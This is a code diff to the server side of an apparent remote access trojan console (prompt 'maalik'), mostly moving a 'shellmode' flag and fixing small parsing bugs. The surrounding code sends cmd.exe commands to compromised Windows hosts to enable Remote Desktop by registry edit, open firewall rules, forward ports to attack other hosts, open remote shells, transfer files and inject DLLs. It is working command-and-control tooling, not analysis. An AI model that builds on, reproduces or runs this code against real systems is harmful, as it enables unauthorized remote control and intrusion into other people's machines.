@@ -63,7 +63,7 @@ class ClientManage:
         location = clients.index(self.client_socket)
         clients.remove(clients[location])
         iplist.remove(iplist[location])
-        hostList.remove(iplist[location])
+        hostList.remove(hostList[location])
 
     def DIRMONITOR(self, check_a_file):
         location = clients.index(self.client_socket)
@@ -129,7 +129,7 @@ class ClientManage:
                 print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
                 print("[+] Forwarding Port.")
 
-                shellmode = True
+                
                 
                 self.SendData("cmd.exe /c " + cmdstr)
                 self.WaitForReply()
@@ -155,7 +155,7 @@ class ClientManage:
                     
                     self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
                     self.WaitForReply()
-                    shellmode = False
+                    
                 except OSError as e:
                     if e.errno == errno.ENOENT:
                         print("[X] Failed to run Metasploit, Is it installed?")
@@ -176,7 +176,7 @@ class ClientManage:
                 print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
                 print("[+] Forwarding Port.")
 
-                shellmode = True
+                
                 
                 self.SendData("cmd.exe /c " + cmdstr)
                 self.WaitForReply()
@@ -195,7 +195,7 @@ class ClientManage:
                         
                         self.SendData("cmd.exe /c netsh interface portproxy reset")
                         self.WaitForReply()
-                        shellmode = False
+                        
                         break
 
         def filetransfer(mfile = None, rfile=None):
@@ -250,15 +250,21 @@ class ClientManage:
             try:
                 try:
                     location = clients.index(self.client_socket)
+                    if not shellmode:
+                        shellmode = True
+
                 except ValueError:
                     print("[X] Client disconnected unexpectedly, Session closed.")
+                    shellmode = False
                     session = False
                     break
                 ip = iplist[location]
                 main = input(Style.BRIGHT + Fore.LIGHTCYAN_EX + "maalik >> ({ip}) : ".format(ip = ip) + Style.RESET_ALL)
                 if(main == "ls"):
-                    self.SendData("dir")
+                    
+                    self.SendData("listdir")
                     self.WaitForReply()
+                    
                 elif(main == "osinfo"):
                     self.SendData("osinfo")
                     self.WaitForReply()
@@ -284,7 +290,7 @@ class ClientManage:
                         self.WaitForReply()
                 elif(main == "shell"):
                     shell = True
-                    shellmode = True
+                    
                     while (shell):
                         sh = input(Style.BRIGHT + "( " + Fore.RED + ip + Style.RESET_ALL + Style.BRIGHT + " ) > ")
                         if(len(sh) > 0):
@@ -293,11 +299,13 @@ class ClientManage:
                                 self.WaitForReply()
                             else:
                                 shell = False
-                                shellmode = False
+                                
                                 break
                             
                 elif(main == "exit"):
+                    shellmode = False
                     session = False
+                    break
 
                 elif(main == "delete"):
                     dlt = input("[:] Enter Filename to Delete : ")
@@ -369,7 +377,7 @@ class ClientManage:
                         
 
                 elif ( main == "rdp_enable"):
-                    shellmode = True
+                    
                     print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop on.")
                     
                     self.SendData('cmd.exe /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
@@ -378,15 +386,15 @@ class ClientManage:
                     
                     self.SendData('cmd.exe /c netsh advfirewall firewall set rule group="remote desktop" new enable=yes')
                     self.WaitForReply()
-                    shellmode = False
+                    
 
                 elif ( main == "rdp_disable" ):
-                    shellmode = True
+                    
                     print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop off.")
                     
                     self.SendData('cmd.exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
                     self.WaitForReply()
-                    shellmode = False
+                    
                     
                 elif ( main == "portfwd"):
                     cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}"
@@ -585,11 +593,11 @@ Open Ports
                     self.WaitForReply()
                     
                 elif(main == "tasklist"):
-                    shellmode = True
+                    
                     
                     self.SendData("cmd.exe /c tasklist")
                     self.WaitForReply()
-                    shellmode = False
+                    
 
                 elif(main == "taskkill"):
                     processname = input("[?] Enter Process name : ")
@@ -619,10 +627,10 @@ Open Ports
                         print("[X] Error : " + str(e))
 
                 elif(main == "upload"):
-                    shellmode = True
+                    
                     filetransfer()
                     time.sleep(2)
-                    shellmode = False
+                    
                 elif(main == "download"):
                     filename = input("[+] File : ")
                     if(len(filename) > 0):
@@ -631,9 +639,9 @@ Open Ports
                         time.sleep(5)
 
                 elif(main == "dllinject"):
-                    shellmode = True
+                    
                     DLLTransfer()
-                    shellmode = False
+                    
                 elif(main == "help"):
                     print(help)
             except KeyboardInterrupt:
@@ -749,7 +757,7 @@ Open Ports
                 # File was recevied by Fhdawn
                 elif(client_data.startswith("F_OK")):
                     try:
-                        fileinfo = client_data.split(":")
+                        fileinfo = client_data.split(",") # split info by comma
                         print(
                             Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Uploaded {filename} ({filesize} bytes) to '{remote_path}' ..."
                             .format(filename = fileinfo[1], filesize = fileinfo[2], remote_path = fileinfo[3]))
